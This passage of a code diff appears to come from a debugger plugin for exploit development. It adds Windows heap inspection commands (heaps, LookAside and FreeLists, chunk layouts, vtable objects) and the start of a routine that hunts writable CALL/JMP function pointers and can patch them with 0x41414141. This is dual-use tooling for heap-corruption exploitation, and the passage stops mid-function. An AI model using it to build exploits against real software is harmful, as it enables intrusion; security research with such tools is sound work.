+				allheaps = dbg.getHeapsAddress()
+			except:
+				allheaps = []
+			dbg.log("Peb : 0x%08x, NtGlobalFlag : 0x%08x" % (dbg.getPEBAddress(),getNtGlobalFlag()))
+			dbg.log("Heaps:")
+			dbg.log("------")
+			if len(allheaps) > 0:
+				for heap in allheaps:
+					segments = getSegmentList(heap)
+					segmentlist = []
+					for segment in segments:
+						segmentlist.append(segment)
+					if not win7mode:
+						segmentlist.sort()
+					segmentinfo = ""
+					for segment in segmentlist:
+						segmentinfo = segmentinfo + "0x%08x" % segment + ","
+					segmentinfo = segmentinfo.strip(",")
+					segmentinfo = " : " + segmentinfo
+					defheap = ""
+					lfhheap = ""
+					keyinfo = ""
+					if heap == getDefaultProcessHeap():
+						defheap = "* Default process heap"
+					if win7mode:
+						iHeap = MnHeap(heap)
+						if iHeap.usesLFH():
+							lfhheapaddress = iHeap.getLFHAddress()
+							lfhheap = "[LFH enabled, _LFH_HEAP at 0x%08x]" % lfhheapaddress
+						if iHeap.getEncodingKey() > 0:
+							keyinfo = "Encoding key: 0x%08x" % iHeap.getEncodingKey()
+					dbg.log("0x%08x (%d segment(s)%s) %s %s %s" % (heap,len(segments),segmentinfo,defheap,lfhheap,keyinfo))
+			else:
+				dbg.log(" ** No heaps found")
+			dbg.log("")
+
+			heapbase = 0
+			searchtype = ""
+			searchtypes = ["lal","lfh","all","segments", "chunks", "layout", "fea", "bea"]
+			error = False
+			filterafter = ""
+			
+			showdata = False
+			findvtablesize = True
+			expand = False
+
+			minstringlength = 32
+			
+			if len(allheaps) > 0:
+				if "h" in args and type(args["h"]).__name__.lower() != "bool":
+					hbase = args["h"].replace("0x","").replace("0X","")
+					if not (isAddress(hbase) or hbase.lower() == "default"):
+						dbg.log("%s is an invalid address" % args["h"], highlight=1)
+						return
+					else:
+						if hbase.lower() == "default":
+							heapbase = getDefaultProcessHeap()
+						else:
+							heapbase = hexStrToInt(hbase)
+			
+				if "t" in args:
+					if type(args["t"]).__name__.lower() != "bool":
+						searchtype = args["t"].lower().replace('"','').replace("'","")
+						if searchtype == "blocks":
+							dbg.log("** Note : type 'blocks' has been replaced with 'chunks'",highlight=1)
+							dbg.log("")
+							searchtype = "chunks"
+						if not searchtype in searchtypes:
+							searchtype = ""
+					else:
+						searchtype = ""
+
+				if "after" in args:
+					if type(args["after"]).__name__.lower() != "bool":
+						filterafter = args["after"].replace('"','').replace("'","")
+						
+				if "v" in args:
+					showdata = True
+					
+				if "expand" in args:
+					expand = True
+					
+				if "fast" in args:
+					findvtablesize = False 
+					showdata = False
+				
+				if searchtype == "" and not "stat" in args:
+					dbg.log("Please specify a valid searchtype -t",highlight=1)
+					dbg.log("Valid values are :",highlight=1)
+					for val in searchtypes:
+						if val != "blocks":	
+							dbg.log("   %s" % val,highlight=1)
+					error = True
+
+				if "h" in args and heapbase == 0:
+					dbg.log("Please specify a valid heap base address -h",highlight=1)
+					error = True
+
+				if "size" in args:
+					if type(args["size"]).__name__.lower() != "bool":
+						size = args["size"].lower()
+						if size.startswith("0x"):
+							minstringlength = hexStrToInt(size)
+						else:
+							minstringlength = int(size)
+					else:
+						dbg.log("Please provide a valid size -size",highlight=1)
+						error = True
+
+				if "clearcache" in args:
+					dbg.forgetKnowledge("vtableCache")
+					dbg.log("[+] vtableCache cleared.")
+			
+			else:
+				dbg.log("No heaps found",highlight=1)
+				return
+			
+			heap_to_query = []
+			heapfound = False
+			
+			if "h" in args:
+				for heap in allheaps:
+					if heapbase == heap:
+						heapfound = True
+						heap_to_query = [heapbase]
+				if not heapfound:
+					error = True
+					dbg.log("0x%08x is not a valid heap base address" % heapbase,highlight=1)
+			else:
+				#show all heaps
+				for heap in allheaps:
+					heap_to_query.append(heap)
+			
+			if error:
+				return
+			else:
+				statinfo = {}
+				logfile_b = ""
+				thislog_b = ""
+				logfile_l = ""
+				logfile_l = ""
+
+				if searchtype == "chunks" or searchtype == "all":
+					logfile_b = MnLog("heapchunks.txt")
+					thislog_b = logfile_b.reset()
+
+				if searchtype == "layout" or searchtype == "all":
+					logfile_l = MnLog("heaplayout.txt")
+					thislog_l = logfile_l.reset()
+
+				for heapbase in heap_to_query:
+					mHeap = MnHeap(heapbase)
+					heapbase_extra = ""
+					frontendinfo = []
+					frontendheapptr = 0
+					frontendheaptype = 0
+					if win7mode:
+						heapkey = mHeap.getEncodingKey()
+						if mHeap.usesLFH():
+							frontendheaptype = 0x2
+							heapbase_extra = " [LFH] "
+							frontendheapptr = mHeap.getLFHAddress()
+					frontendinfo = [frontendheaptype,frontendheapptr]
+						
+					dbg.log("")
+					dbg.log("[+] Processing heap 0x%08x%s" % (heapbase,heapbase_extra))
+
+					if searchtype == "fea":
+						if win7mode:
+							searchtype = "lfh"
+						else:
+							searchtype = "lal"
+					if searchtype == "bea":
+							searchtype = "freelist"
+
+					# LookAsideList
+					if searchtype == "lal" or (searchtype == "all" and not win7mode):
+						lalindex = 0
+						if win7mode:
+							dbg.log(" !! This version of the OS doesn't have a LookAside List !!")
+						else:
+							dbg.log("[+] FrontEnd Allocator : LookAsideList")
+							dbg.log("[+] Getting LookAsideList for heap 0x%08x" % heapbase)
+							# do we have a LAL for this heap ?
+							FrontEndHeap = mHeap.getFrontEndHeap()
+							if FrontEndHeap > 0:
+								dbg.log("    FrontEndHeap: 0x%08x" % FrontEndHeap)
+								fea_lal = mHeap.getLookAsideList()
+								dbg.log("    Nr of (non-empty) LookAside Lists : %d" % len(fea_lal))
+								dbg.log("")
+								for lal_table_entry in sorted(fea_lal.keys()):
+									expectedsize = lal_table_entry * 8
+									nr_of_chunks = len(fea_lal[lal_table_entry])
+									lalhead = struct.unpack('<L',dbg.readMemory(FrontEndHeap + (0x30 * lal_table_entry),4))[0]
+									dbg.log("LAL [%d] @0x%08x, Expected Chunksize 0x%x (%d), Flink : 0x%08x" % (lal_table_entry,FrontEndHeap + (0x30 * lal_table_entry),expectedsize,expectedsize,lalhead))
+									mHeap.showLookAsideHead(lal_table_entry)
+									dbg.log("  %d chunks:" % nr_of_chunks)
+									for chunkindex in fea_lal[lal_table_entry]:
+										lalchunk = fea_lal[lal_table_entry][chunkindex]
+										chunksize = lalchunk.size * 8
+										flag = getHeapFlag(lalchunk.flag)
+										data = ""
+										if showdata:
+											data = bin2hex(dbg.readMemory(lalchunk.userptr,16))
+										dbg.log("     ChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, Userspace: 0x%x (%s) %s" % (lalchunk.chunkptr, lalchunk.userptr,lalchunk.flink,chunksize,lalchunk.usersize,lalchunk.usersize+lalchunk.remaining,flag,data))
+										if chunksize != expectedsize:
+											dbg.log("               ^^ ** Warning - unexpected size value, header corrupted ? **",highlight=True)
+									dbg.log("")
+							else:
+								dbg.log("[+] No LookAsideList found for this heap")
+								dbg.log("")
+
+					if searchtype == "lfh" or (searchtype == "all" and win7mode):
+						dbg.log("[+] FrontEnd Allocator : Low Fragmentation Heap")
+						dbg.log("     ** Not implemented yet **")
+						
+					if searchtype == "freelist" or (searchtype == "all" and not win7mode):
+						flindex = 0
+						dbg.log("[+] BackEnd Allocator : FreeLists")
+						dbg.log("[+] Getting FreeLists for heap 0x%08x" % heapbase)
+						thisfreelist = mHeap.getFreeList()
+						thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()
+						bitmapstr = ""
+						for bit in thisfreelistinusebitmap:
+							bitmapstr += str(bit)
+						dbg.log("[+] FreeListsInUseBitmap:")
+						printDataArray(bitmapstr,32,prefix="    ")
+						# make sure the freelist is printed in the correct order
+						flindex = 0
+						while flindex < 128:
+							if flindex in thisfreelist:
+								freelist_addy = heapbase + 0x178 + (8 * flindex)
+								expectedsize = ">1016"
+								expectedsize2 = ">0x%x" % 1016
+								if flindex != 0:
+									expectedsize2 = str(8 * flindex)
+									expectedsize = "0x%x" % (8 * flindex)			
+								dbg.log("[+] FreeList[%02d] at 0x%08x, Expected size: %s (%s)" % (flindex,freelist_addy,expectedsize,expectedsize2))
+								flindicator = 0
+								for flentry in thisfreelist[flindex]:
+									freelist_chunk = thisfreelist[flindex][flentry]
+									chunksize = freelist_chunk.size * 8
+									dbg.log("     ChunkPtr: 0x%08x, Header: 0x%x bytes, UserPtr: 0x%08x, Flink: 0x%08x, Blink: 0x%08x, ChunkSize: 0x%x (%d), Usersize: 0x%x (%d) " % (freelist_chunk.chunkptr, freelist_chunk.headersize, freelist_chunk.userptr,freelist_chunk.flink,freelist_chunk.blink,chunksize,chunksize,freelist_chunk.usersize,freelist_chunk.usersize))
+									if flindex != 0 and chunksize != (8*flindex):
+										dbg.log("     ** Header may be corrupted! **", highlight = True)
+									flindicator = 1
+								if flindex > 1 and int(bitmapstr[flindex]) != flindicator:
+									dbg.log("     ** FreeListsInUseBitmap mismatch for index %d! **" % flindex, highlight = True)
+							flindex += 1
+
+					if searchtype == "layout" or searchtype == "all":
+						segments = getSegmentsForHeap(heapbase)
+
+						sortedsegments = []
+						global vtableCache
+						# read vtableCache from knowledge
+						vtableCache = dbg.getKnowledge("vtableCache")
+						if vtableCache is None:
+							vtableCache = {}
+
+						for seg in segments:
+							sortedsegments.append(seg)
+						if not win7mode:
+							sortedsegments.sort()
+						segmentcnt = 0
+						minstringlen = minstringlength
+						blockmem = []
+						nr_filter_matches = 0
+
+						vablocks = []
+						# VirtualAllocdBlocks
+						vachunks = mHeap.getVirtualAllocdBlocks()
+						infoblocks = {}
+						infoblocks["segments"] = sortedsegments
+						if expand:
+							infoblocks["virtualallocdblocks"] = [vachunks]
+
+						for infotype in infoblocks:
+							heapdata = infoblocks[infotype]
+							for thisdata in heapdata:
+								if infotype == "segments":
+									seg = thisdata
+									segmentcnt += 1
+									segstart = segments[seg][0]
+									segend = segments[seg][1]
+									FirstEntry = segments[seg][2]
+									LastValidEntry = segments[seg][3]								
+									datablocks = walkSegment(FirstEntry,LastValidEntry,heapbase)
+									tolog = "----- Heap 0x%08x%s, Segment 0x%08x - 0x%08x (%d/%d) -----" % (heapbase,heapbase_extra,segstart,segend,segmentcnt,len(sortedsegments))
+
+								if infotype == "virtualallocdblocks":
+									datablocks = heapdata[0]
+									tolog = "----- Heap 0x%08x%s, VirtualAllocdBlocks : %d" % (heapbase,heapbase_extra,len(datablocks))
+
+								logfile_l.write(" ",thislog_l)								
+								dbg.log(tolog)
+								logfile_l.write(tolog,thislog_l)
+
+								sortedblocks = []
+								for block in datablocks:
+									sortedblocks.append(block)
+								sortedblocks.sort()								
+
+								# for each block, try to get info
+								# object ?
+								# BSTR ?
+								# str ?
+								for block in sortedblocks:
+									showinlog = False
+									thischunk = datablocks[block]
+									unused = thischunk.unused
+									headersize = thischunk.headersize
+									flags = getHeapFlag(thischunk.flag)
+									userptr = block + headersize
+									psize = thischunk.prevsize * 8
+									blocksize = thischunk.size * 8
+									selfsize = blocksize
+									usersize = selfsize - unused				
+									usersize = blocksize - unused
+									extratxt = ""	
+									if infotype == "virtualallocdblocks":
+										selfsize = thischunk.commitsize * 8
+										blocksize = selfsize
+										usersize = selfsize - unused
+										nextblock = thischunk.flink
+									# read block into memory
+									blockmem = dbg.readMemory(block,blocksize)
+
+									# first, find all strings (ascii, unicode and BSTR)
+									asciistrings = {}
+									unicodestrings = {}
+									bstr = {}
+									objects = {}
+									asciistrings = getAllStringOffsets(blockmem,minstringlen)
+
+									# determine remaining subsets of the original block
+									remaining = {}
+									curpos = 0
+									for stringpos in asciistrings:
+										if stringpos > curpos:
+											remaining[curpos] = stringpos - curpos
+											curpos = asciistrings[stringpos]
+									if curpos < blocksize:
+										remaining[curpos] = blocksize
+
+									# search for unicode in remaining subsets only - tx for the regex help Turboland !
+									for remstart in remaining:
+										remend = remaining[remstart]
+										thisunicodestrings = getAllUnicodeStringOffsets(blockmem[remstart:remend],minstringlen,remstart)
+										# append results to master list
+										for tus in thisunicodestrings:
+											unicodestrings[tus] = thisunicodestrings[tus]
+
+									# check each unicode, maybe it's a BSTR
+									tomove = []
+									for unicodeoffset in unicodestrings:
+										delta = unicodeoffset
+										size = (unicodestrings[unicodeoffset] - unicodeoffset)/2
+										if delta >= 4:
+											maybesize = struct.unpack('<L',blockmem[delta-3:delta+1])[0] # it's an offset, remember ?
+											if maybesize == (size*2):
+												tomove.append(unicodeoffset)
+												bstr[unicodeoffset] = unicodestrings[unicodeoffset]
+									for todel in tomove:
+										del unicodestrings[todel]
+
+									# get objects too
+									# find all unique objects
+									# again, just store offset
+									objects = {}
+									orderedobj = []
+									if __DEBUGGERAPP__ == "WinDBG":
+										nrlines = int(float(blocksize) / 4)
+										cmd2run = "dds 0x%08x L 0x%x" % ((block + headersize),nrlines)
+										output = dbg.nativeCommand(cmd2run)
+										outputlines = output.split("\n")
+										for line in outputlines:
+											if line.find("::") > -1 and line.find("vftable") > -1:
+												parts = line.split(" ")
+												objconstr = ""
+												if len(parts) > 3:
+													objectptr = hexStrToInt(parts[0])
+													cnt = 2
+													objectinfo = ""
+													while cnt < len(parts):
+														objectinfo += parts[cnt] + " "
+														cnt += 1
+													parts2 = line.split("::")
+													parts2name = ""
+													pcnt = 0
+													while pcnt < len(parts2)-1:
+														parts2name = parts2name + "::" + parts2[pcnt]
+														pcnt += 1
+													parts3 = parts2name.split(" ")
+													if len(parts3) > 3:
+														objconstr = parts3[3]
+													if not objectptr in objects:
+														objects[objectptr-block] = [objectinfo,objconstr]
+													objsize = 0
+													if findvtablesize:
+														if not objconstr in vtableCache:
+															cmd2run = "u %s::CreateElement L 12" % objconstr
+															objoutput = dbg.nativeCommand(cmd2run)
+															if not "HeapAlloc" in objoutput:
+																cmd2run = "x %s::operator*" % objconstr
+																oplist = dbg.nativeCommand(cmd2run)
+																oplines = oplist.split("\n")
+																oppat = "%s::operator" % objconstr
+																for opline in oplines:
+																	if oppat in opline and not "del" in opline:
+																		lineparts = opline.split(" ")
+																		cmd2run = "uf %s" % lineparts[0]
+																		objoutput = dbg.nativeCommand(cmd2run)
+																		break
+															if "HeapAlloc" in objoutput:
+																objlines = objoutput.split("\n")
+																lineindex = 0
+																for objline in objlines:
+																	if "HeapAlloc" in objline:
+																		if lineindex >= 3:
+																			sizeline = objlines[lineindex-3]
+																			if "push" in sizeline:
+																				sizelineparts = sizeline.split("push")
+																				if len(sizelineparts) > 1:
+																					sizevalue = sizelineparts[len(sizelineparts)-1].replace(" ","").replace("h","")
+																					try:
+																						objsize = hexStrToInt(sizevalue)
+																						# adjust allocation granulariy
+																						remainsize = objsize - ((objsize / 8) * 8)
+																						while remainsize != 0:
+																							objsize += 1
+																							remainsize = objsize - ((objsize / 8) * 8)
+																					except:
+																						#print traceback.format_exc()
+																						objsize = 0
+																				break
+																	lineindex += 1
+															vtableCache[objconstr] = objsize
+														else:
+															objsize = vtableCache[objconstr]
+
+									# remove object entries that belong to the same object
+									allobjects = []
+									objectstodelete = []
+									for optr in objects:
+										allobjects.append(optr)
+									allobjects.sort()
+									skipuntil = 0
+									for optr in allobjects:
+										if optr < skipuntil:
+											objectstodelete.append(optr)
+										else:
+											objname = objects[optr][1]
+											objsize = 0
+											try:
+												objsize = vtableCache[objname]
+											except:
+												objsize = 0
+											skipuntil = optr + objsize
+									# remove vtable lines that are too close to each other
+									minvtabledistance = 0x0c
+									prevvname = ""
+									prevptr = 0
+									thisvname = ""
+									for optr in allobjects:
+										thisvname = objects[optr][1]
+										if thisvname == prevvname and (optr - prevptr) <= minvtabledistance:
+											if not optr in objectstodelete:
+												objectstodelete.append(optr)
+										else:
+											prevptr = optr
+											prevvname = thisvname
+
+
+									for vtableptr in objectstodelete:
+										del objects[vtableptr]
+
+									for obj in objects:
+										orderedobj.append(obj)
+
+									for ascstring in asciistrings:
+										orderedobj.append(ascstring)
+
+									for unicodestring in unicodestrings:
+										orderedobj.append(unicodestring)
+
+									for bstrobj in bstr:
+										orderedobj.append(bstrobj)
+
+									orderedobj.sort()
+
+									# print out details for this chunk
+									chunkprefix = ""
+									fieldname1 = "Usersize"
+									fieldname2 = "ChunkSize"
+									if infotype == "virtualallocdblocks":
+										chunkprefix = "VA "
+										fieldname1 = "CommitSize"
+									tolog = "%sChunk 0x%08x (%s 0x%x, %s 0x%x) : %s" % (chunkprefix,block,fieldname1,usersize,fieldname2,usersize+unused,flags)
+									if showdata:
+										dbg.log(tolog)
+									logfile_l.write(tolog,thislog_l)
+
+									previousptr = block
+									previoussize = 0
+									showinlog = False
+									for ptr in orderedobj:
+										ptrtype = ""
+										ptrinfo = ""
+										data = ""
+										alldata = ""
+										blockinfo = ""
+										ptrbytes = 0
+										endptr = 0
+										datasize = 0
+										ptrchars = 0
+										infoptr = block + ptr
+										endptr = 0
+										if ptr in asciistrings:
+											ptrtype = "String"
+											dataend = asciistrings[ptr]
+											data = blockmem[ptr:dataend]
+											alldata = data
+											ptrbytes = len(data)
+											ptrchars = ptrbytes
+											datasize = ptrbytes
+											if ptrchars > 100:
+												data = data[0:100]+"..."
+											blockinfo = "%s (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
+											infoptr = block + ptr
+											endptr = infoptr + ptrchars -  1  # need -1
+										elif ptr in bstr:
+											ptrtype = "BSTR"
+											dataend = bstr[ptr]
+											data = blockmem[ptr:dataend].replace("\x00","")
+											alldata = data
+											ptrchars = len(data)
+											ptrbytes = ptrchars*2
+											datasize = ptrbytes+6
+											infoptr = block + ptr - 3
+											if ptrchars > 100:
+												data = data[0:100]+"..."
+											blockinfo = "%s 0x%x/%d bytes (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes+6,ptrbytes+6,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
+											endptr = infoptr + ptrbytes + 6
+										elif ptr in unicodestrings:
+											ptrtype = "Unicode"
+											dataend = unicodestrings[ptr]
+											data = blockmem[ptr:dataend].replace("\x00","")
+											alldata = ""
+											ptrchars = len(data)
+											ptrbytes = ptrchars * 2
+											datasize = ptrbytes
+											if ptrchars > 100:
+												data = data[0:100]+"..."
+											blockinfo = "%s (0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
+											endptr = infoptr + ptrbytes + 2
+										elif ptr in objects:
+											ptrtype = "Object"
+											data = objects[ptr][0]
+											vtablename = objects[ptr][1]
+											datasize = 0
+											if vtablename in vtableCache:
+												datasize = vtableCache[vtablename]
+											alldata = data
+											if datasize > 0:
+												blockinfo = "%s (0x%x bytes): %s" % (ptrtype,datasize,data)
+											else:
+												blockinfo = "%s : %s" % (ptrtype,data)
+											endptr = infoptr + datasize
+
+										# calculate delta
+										slackspace = infoptr - previousptr
+										if endptr > 0 and not ptrtype=="Object":
+											if slackspace >= 0:
+												tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
+											else:
+												tolog = "       @ %08x->%08x : %s" % (infoptr,endptr,blockinfo)
+										else:
+											if slackspace >= 0:
+												if endptr != infoptr:
+													tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
+												else:
+													tolog = "  +%04x @ %08x           : %s" % (slackspace,infoptr,blockinfo)
+											else:
+												tolog = "        @ %08x           : %s" % (infoptr,blockinfo)
+
+										if filterafter == "" or (filterafter != "" and filterafter in alldata):
+											showinlog = True  # keep this for the entire block
+											if (filterafter != ""):
+												nr_filter_matches += 1
+										if showinlog:
+											if showdata:
+												dbg.log(tolog)
+											logfile_l.write(tolog,thislog_l)
+										
+										previousptr = endptr
+										previoussize = datasize
+
+						# save vtableCache again
+						if filterafter != "":
+							tolog = "Nr of filter matches: %d" % nr_filter_matches
+							if showdata:
+								dbg.log("")
+								dbg.log(tolog)
+							logfile_l.write("",thislog_l)
+							logfile_l.write(tolog,thislog_l)
+						dbg.addKnowledge("vtableCache",vtableCache)
+
+
+					if searchtype in ["segments","all","chunks"] or "stat" in args:
+						segments = getSegmentsForHeap(heapbase)
+						dbg.log("Segment List for heap 0x%08x:" % (heapbase))
+						dbg.log("---------------------------------")
+						sortedsegments = []
+						for seg in segments:
+							sortedsegments.append(seg)
+						if not win7mode:
+							sortedsegments.sort()
+						vablocks = []
+						# VirtualAllocdBlocks
+						vachunks = mHeap.getVirtualAllocdBlocks()
+						infoblocks = {}
+						infoblocks["segments"] = sortedsegments
+						if searchtype in ["all","chunks"]:
+							infoblocks["virtualallocdblocks"] = [vachunks]
+
+						for infotype in infoblocks:
+							heapdata = infoblocks[infotype]
+							for thisdata in heapdata:
+								tolog = ""
+								if infotype == "segments":
+									# 0 : segmentstart
+									# 1 : segmentend
+									# 2 : firstentry
+									# 3 : lastentry
+									seg = thisdata
+									segstart = segments[seg][0]
+									segend = segments[seg][1]
+									segsize = segend-segstart
+									FirstEntry = segments[seg][2]
+									LastValidEntry = segments[seg][3]
+									tolog = "Segment 0x%08x - 0x%08x (FirstEntry: 0x%08x - LastValidEntry: 0x%08x): 0x%08x bytes" % (segstart,segend,FirstEntry,LastValidEntry, segsize)
+								if infotype == "virtualallocdblocks":
+									vablocks = heapdata
+									tolog = "Heap : 0x%08x%s : VirtualAllocdBlocks : %d " % (heapbase,heapbase_extra,len(vachunks))
+								#dbg.log("")
+								dbg.log(tolog)
+								if searchtype == "chunks" or "stat" in args:
+									try:
+										logfile_b.write("Heap: 0x%08x%s" % (heapbase,heapbase_extra),thislog_b)
+										#logfile_b.write("",thislog_b)
+										logfile_b.write(tolog,thislog_b)
+									except:
+										pass
+									if infotype == "segments":
+										datablocks = walkSegment(FirstEntry,LastValidEntry,heapbase)
+									else:
+										datablocks = heapdata[0]
+									tolog = "    Nr of chunks : %d " % len(datablocks)
+									dbg.log(tolog)
+									try:
+										logfile_b.write(tolog,thislog_b)
+									except:
+
+										pass
+									if len(datablocks) > 0:
+										tolog = "    _HEAP_ENTRY  psize   size  unused  UserPtr   UserSize"
+										dbg.log(tolog)
+										try:
+											logfile_b.write(tolog,thislog_b)
+										except:
+											pass
+										sortedblocks = []
+										for block in datablocks:
+											sortedblocks.append(block)
+										sortedblocks.sort()
+										nextblock = 0
+										segstatinfo = {}
+										for block in sortedblocks:
+											showinlog = False
+											thischunk = datablocks[block]
+											unused = thischunk.unused
+											headersize = thischunk.headersize
+											flagtxt = getHeapFlag(thischunk.flag)
+											if not infotype == "virtualallocdblocks" and "virtallocd" in flagtxt.lower():
+												flagtxt += " (LFH)"
+												flagtxt = flagtxt.replace("Virtallocd","Internal")
+											userptr = block + headersize
+											psize = thischunk.prevsize * 8
+											blocksize = thischunk.size * 8
+											selfsize = blocksize
+											usersize = selfsize - unused				
+											usersize = blocksize - unused
+											extratxt = ""	
+											if infotype == "virtualallocdblocks":
+												nextblock = thischunk.flink
+												extratxt = " (0x%x bytes committed)" % (thischunk.commitsize * 8)
+											else:
+												nextblock = block + blocksize
+
+											if not "stat" in args:
+												tolog = "       %08x  %05x  %05x   %05x  %08x  %08x (%d) (%s) %s" % (block,psize,selfsize,unused,block+headersize,usersize,usersize,flagtxt,extratxt)
+												dbg.log(tolog)
+												logfile_b.write(tolog,thislog_b)
+											else:
+												if not usersize in segstatinfo:
+													segstatinfo[usersize] = 1
+												else: 
+													segstatinfo[usersize] += 1
+										
+										if nextblock > 0 and nextblock < LastValidEntry:
+											if not "stat" in args:
+												nextblock -= headersize
+												restbytes = LastValidEntry - nextblock
+												tolog = "       0x%08x - 0x%08x (end of segment) : 0x%x (%d) uncommitted bytes" % (nextblock,LastValidEntry,restbytes,restbytes)
+												dbg.log(tolog)
+												logfile_b.write(tolog,thislog_b)
+										if "stat" in args:
+											statinfo[segstart] = segstatinfo
+											# show statistics
+											orderedsizes = []
+											totalalloc = 0
+											for thissize in segstatinfo:
+												orderedsizes.append(thissize)
+												totalalloc += segstatinfo[thissize] 
+											orderedsizes.sort(reverse=True)
+											tolog = "    Segment Statistics:"
+											dbg.log(tolog)
+											try:
+												logfile_b.write(tolog,thislog_b)
+											except:
+												pass
+											for thissize in orderedsizes:
+												nrblocks = segstatinfo[thissize]
+												percentage = (float(nrblocks) / float(totalalloc)) * 100
+												tolog = "    Size : 0x%x (%d) : %d chunks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)
+
+												dbg.log(tolog)
+												try:
+													logfile_b.write(tolog,thislog_b)
+												except:
+													pass
+											tolog = "    Total chunks : %d" % totalalloc
+											dbg.log(tolog)
+											try:
+												logfile_b.write(tolog,thislog_b)
+											except:
+												pass
+											tolog = ""
+											try:
+												logfile_b.write(tolog,thislog_b)
+											except:
+												pass
+											dbg.log("")
+										dbg.log("")
+
+
+				if "stat" in args and len(statinfo) > 0:
+					tolog = "Global statistics"
+					dbg.log(tolog)
+					try:
+						logfile_b.write(tolog,thislog_b)
+					except:
+						pass
+					globalstats = {}
+					allalloc = 0
+					for seginfo in statinfo:
+						segmentstats = statinfo[seginfo]
+						for size in segmentstats:
+							allalloc += segmentstats[size]
+							if not size in globalstats:
+								globalstats[size] = segmentstats[size]
+							else:
+								globalstats[size] += segmentstats[size]
+					orderedstats = []
+					for size in globalstats:
+						orderedstats.append(size)
+					orderedstats.sort(reverse=True)
+					for thissize in orderedstats:
+						nrblocks = globalstats[thissize]
+						percentage = (float(nrblocks) / float(allalloc)) * 100
+						tolog = "  Size : 0x%x (%d) : %d chunks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)
+						dbg.log(tolog)
+						try:
+							logfile_b.write(tolog,thislog_b)
+						except:
+							pass
+					tolog = "  Total chunks : %d" % allalloc
+					dbg.log(tolog)
+					try:
+						logfile_b.write(tolog,thislog_b)
+					except:
+						pass
+			#dbg.log("%s" % "*" * 90)					
+					
+			return
+		
+		def procGetIAT(args):
+			return procGetxAT(args,"iat")
+
+		def procGetEAT(args):
+			return procGetxAT(args,"eat")
+
+		def procFwptr(args):
+			modulecriteria = {}
+			criteria = {}			
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			modulestosearch = getModulesToQuery(modulecriteria)
+			allpages = dbg.getMemoryPages()
+			orderedpages = []
+			for page in allpages.keys():
+				orderedpages.append(page)
+			orderedpages.sort()
+			pagestoquery = {}
+			fwptrs = {}
+
+			objwptr = MnLog("wptr.txt")
+			wptrfile = objwptr.reset()
+
+			setbps = False
+			dopatch = False
+			dofreelist = False
+
+			if "bp" in args:
+				setbps = True
+
+			if "patch" in args:
+				dopatch = True
+
+			if "freelist" in args:
+				dofreelist = True
+
+			chunksize = 0
+			offset = 0
+
+			if "chunksize" in args:
+				if type(args["chunksize"]).__name__.lower() != "bool":
+					try:
+						if str(args["chunksize"]).lower().startswith("0x"):
+							chunksize = int(args["chunksize"],16)
+						else:
+							chunksize = int(args["chunksize"])
+					except:
+						chunksize = 0
+				if chunksize == 0 or chunksize > 0xffff:
+					dbg.log("[!] Invalid chunksize specified")
+					if chunksize > 0xffff:
+						dbg.log("[!] Chunksize must be <= 0xffff")
+						chunksize == 0
+						return
+				else:
+					dbg.log("[+] Will filter on chunksize 0x%0x" % chunksize )
+			if dofreelist:
+				if "offset" in args:
+					if type(args["offset"]).__name__.lower() != "bool":
+						try:
+							if str(args["offset"]).lower().startswith("0x"):
+								offset = int(args["offset"],16)
+							else:
+								offset = int(args["offset"])
+						except:
+							offset = 0
+					if offset == 0:
+						dbg.log("[!] Invalid offset specified")
+					else:
+						dbg.log("[+] Will add 0x%0x bytes between flink/blink and fwptr" % offset )			
+
+			if not silent:
+				if setbps:
+					dbg.log("[+] Will set breakpoints on found CALL/JMP")
+				if dopatch:
+					dbg.log("[+] Will patch target for CALL/JMP with 0x41414141")
+				dbg.log("[+] Extracting .text/.code sections from %d modules" % len(modulestosearch))
+				dbg.updateLog()
+
+			if len(modulestosearch) > 0:		
+				for thismodule in modulestosearch:
+					# find text section
+					for thispage in orderedpages:
+						page = allpages[thispage]
+						pagestart = page.getBaseAddress()
+						pagesize = page.getSize()
+						ptr = MnPointer(pagestart)
+						mod = ""
+						sectionname = ""
+						try:
+							mod = ptr.belongsTo()
+							if mod == thismodule:
+								sectionname = page.getSection()
+								if sectionname == ".text" or sectionname == ".code":	
+									pagestoquery[mod] = [pagestart,pagestart+pagesize]
+									break
+						except:
+							pass
+			if len(pagestoquery) > 0:
+				if not silent:
+					dbg.log("[+] Analysing .text/.code sections")
+					dbg.updateLog()
+				for modname in pagestoquery:
+					tmodcnt = 0
+					nr_sizematch = 0
+					pagestart = pagestoquery[modname][0]
+					pageend = pagestoquery[modname][1]
+					if not silent:
+						dbg.log("    - Carving through %s (0x%08x - 0x%08x)" % (modname,pagestart,pageend))
+						dbg.updateLog()
+					loc = pagestart
+					while loc < pageend:
+						try:
+							thisinstr = dbg.disasm(loc)
+							instrbytes = thisinstr.getDump()
+							if thisinstr.isJmp() or thisinstr.isCall():
+								# check if it's reading a pointer from somewhere
+								instrtext = getDisasmInstruction(thisinstr)
+								opcodepart = instrbytes.upper()[0:4]
+								if opcodepart == "FF15" or opcodepart == "FF25":
+									if "[" in instrtext and "]" in instrtext:
+										parts1 = instrtext.split("[")
+										if len(parts1) > 1:
+											parts2 = parts1[1].split("]")
+											addy = parts2[0]
+											# get the actual value and check if it's writeable
+											if "(" in addy and ")" in addy:
+												parts1 = addy.split("(")
+												parts2 = parts1[1].split(")")
+												addy = parts2[0]
+											if isHexValue(addy):
+												addyval = hexStrToInt(addy)
+												access = getPointerAccess(addyval)
+												if "WRITE" in access:
+													if meetsCriteria(addyval,criteria):
+														savetolog = False
+														sizeinfo = ""
+														if chunksize == 0:
+															savetolog = True
+														else:
+															# check if this location could acts as a heap chunk for a certain size
+															# the size field would be placed at the current location - 8 bytes
+															# and is 2 bytes large
+															sizeval = 0
+															if not dofreelist:
